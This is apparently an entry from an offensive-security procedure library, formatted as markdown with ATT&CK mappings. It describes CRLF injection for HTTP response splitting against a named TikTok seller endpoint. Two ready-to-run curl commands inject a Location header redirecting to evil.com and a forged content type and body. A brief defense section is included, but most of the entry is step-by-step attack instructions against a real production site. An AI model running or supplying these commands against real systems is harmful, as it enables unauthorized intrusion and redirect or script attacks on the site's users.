---
id: 5e561748-3d97-4adb-aa90-72ae2ab735e8
name: Inject-CRLF-Payload-for-Response-Splitting
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:34.753Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - crlf-injection
  - response-splitting
commands:
  - '[[commands/curl-crlf-injection]]'
platforms:
  - Web
tools: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Inject-CRLF-Payload-for-Response-Splitting

## Summary

This procedure exploits the vulnerable 'hack_redirect_now' parameter by injecting CRLF sequences to split the HTTP response, allowing insertion of arbitrary headers or body content in the TikTok seller endpoint.

## Description

HTTP Response Splitting occurs when user input containing CRLF is not sanitized, enabling attackers to terminate the original response and append new ones. In this TikTok scenario, the endpoint processes the parameter directly, allowing manipulation of redirects or injection points. Prerequisites include confirmed reflection from prior testing; outcomes enable downstream exploits like XSS or redirects.

## Requirements

1. Confirmed vulnerable endpoint from initial testing
2. URL-encoded CRLF knowledge (%0D%0A for \r\n)
3. Ability to inspect HTTP responses verbosely

## Defense

Defensive measures and detection strategies:

- Sanitize inputs by removing or encoding CRLF characters server-side
- Validate redirect URLs against a whitelist
- Deploy WAF rules to block requests containing %0D%0A in parameters

## Objectives

1. Split the HTTP response with injected CRLF
2. Insert custom headers (e.g., Location)
3. Prepare for payload delivery in split sections

## Instructions

### Step 1: Craft and Send Splitting Payload

**Context**: Use CRLF to end the current response and start a new one with a fake header.

**Command** ([[commands/curl-crlf-injection]]):
```bash
curl -X GET "https://seller.tiktok.com/endpoint?hack_redirect_now=%0D%0ALocation:%20https://evil.com%0D%0A" -v
```

> The payload injects a Location header after splitting. Expected output shows the injected header in the verbose response, confirming splitting.

### Step 2: Verify Splitting Effect

**Context**: Check if the server honors the injected content, such as following the fake redirect.

**Command** ([[commands/curl-crlf-injection]]):
```bash
curl -X GET "https://seller.tiktok.com/endpoint?hack_redirect_now=%0D%0AContent-Type:%20text/html%0D%0A%0D%0AInjected%20Body" -v -i
```

> Use -i for full headers. Success is multiple header sets or altered content type/body.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-crlf-injection]]

## Tools Used


## Tags

- [[crlf-injection]]
- [[http-response-splitting]]
